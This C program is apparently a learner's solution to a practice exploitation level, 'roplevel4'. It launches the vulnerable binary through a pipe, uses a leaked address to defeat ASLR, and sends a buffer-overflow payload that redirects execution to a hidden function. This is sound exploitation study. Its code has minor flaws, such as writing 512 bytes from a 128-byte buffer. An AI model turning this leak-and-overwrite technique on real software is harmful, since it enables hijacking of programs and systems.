#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    // static addresses of the leakMe_orig_addr variable and secret_orig_addr function (from gdb)
    int leakMe_orig_addr = 0xc03c;
    int secret_orig_addr = 0xbd28;

    char padding[64] =
    {
    0x41,0x41,0x41,0x41,
    0x42,0x42,0x42,0x42,
    0x43,0x43,0x43,0x43,
    0x44,0x44,0x44,0x44,
    0x45,0x45,0x45,0x45,
    0x46,0x46,0x46,0x46
    };

    char payload[128];

    // 0 is read end, 1 is read and write end
    int fd[2];
    pid_t pid1;
    pipe(fd);

    pid1 = fork();

    // if pid1 == 0, create child process that runs roplevel 4 for us
    if(pid1 == 0) {
        printf("[*] creating child process successful\n");
        // close read end of pipe (parent process not reading any data)
        close(fd[1]);

        // duplicate write end of pipe
        // lets us write to STDIN of the program (./roplevel4)
        dup2(fd[0],0);

        //exec roplevel4
        execv("./roplevel4", NULL);
    }


    // sleep for 3 seconds for leak.txt allowing for ~/leak.txt to be created
    sleep(3);

    // Now child process has been created, continue exploitation
    FILE *file = fopen("/var/mobile/leak.txt","r");

    // read 32 bytes from file and store it in the char[]
    char readDate[32];
    fgets(readDate,32,file);
    fclose(file);
    printf("[*] scanned input from file: %s\n", readDate);

    int leaked_addr;
    sscanf(readDate, "%x", &leaked_addr);
    printf("[*] Leaked address: %x\n", leaked_addr);

    // the offset of the memory location the program is in
    // is the leaked address of leakMe_orig_addr (provided by program) - the static address of leakMe_orig_addr
    int aslr_slide = leaked_addr - leakMe_orig_addr;
    printf("[*] ASLR slide offset: %x\n", aslr_slide);


    // calculate the current address of thesecret_orig_addrfunction
    int new_secret_addr = secret_orig_addr+ aslr_slide;


    // ---------- (re)teaching myself bitwise shifting and operations -------------
    // so I have to put the bytes in reverse order (32bits = 4 bytes)
    // new_secret_addr& 0xff (1111 1111) erases the front 24 bits ( AND'ing them with 0)
    // this gives me the bottom byte of the address
    // bitshift >> 8 erases the bottom 8 and lets me do the next 8 bits
    // rinse and repeat

    unsigned int byte1 = (new_secret_addr & 0xff);
    unsigned int byte2 = (new_secret_addr >> 8)  & 0xff;
    unsigned int byte3 = (new_secret_addr >> 16) & 0xff;
    unsigned int byte4 = (new_secret_addr >> 24) & 0xff; //not needed since the first byte is always 0x00

    // constructs a string and saves it into payload
    sprintf(payload,"%s%c%c%c%c", padding,byte1, byte2, byte3, byte4);
    printf("[*] Payload crafted.\n");

    // write payload to pipe (writing end)
    write(fd[1], payload,512);

    return EXIT_SUCCESS;
}
